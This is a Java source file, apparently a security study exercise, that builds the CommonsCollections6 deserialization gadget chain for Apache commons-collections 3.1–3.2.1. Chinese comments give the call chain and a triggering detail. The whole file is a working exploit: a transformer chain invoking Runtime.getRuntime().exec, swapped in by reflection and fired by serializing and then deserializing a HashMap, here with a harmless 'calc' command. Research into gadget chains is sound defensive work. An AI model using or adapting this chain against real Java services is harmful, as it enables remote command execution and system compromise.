import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

import static util.Util.serialize;
import static util.Util.unserialize;


/*调用链:
HashMap.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                LazyMap.get()
                    ChainedTransformer.transform()
                        InvokerTransformer.transform()
* */
/*版本依赖commons-collections : 3.1～3.2.1*/
/*注意lazyMap.clear();去除hashMap对lazmap中key的影响，否则无法调用transform*/
public class CommonCollection6_HashMap {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        ChainedTransformer fakechain = new ChainedTransformer(new Transformer[]{});
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(new HashMap(),fakechain);
        TiedMapEntry tiedMapEntry =new TiedMapEntry(lazyMap,"dragonkeep");
        hashMap.put(tiedMapEntry,"dragonkeep");

        Field field=ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(fakechain,transformers);
        lazyMap.clear();
        serialize(hashMap);
        unserialize();

    }
}
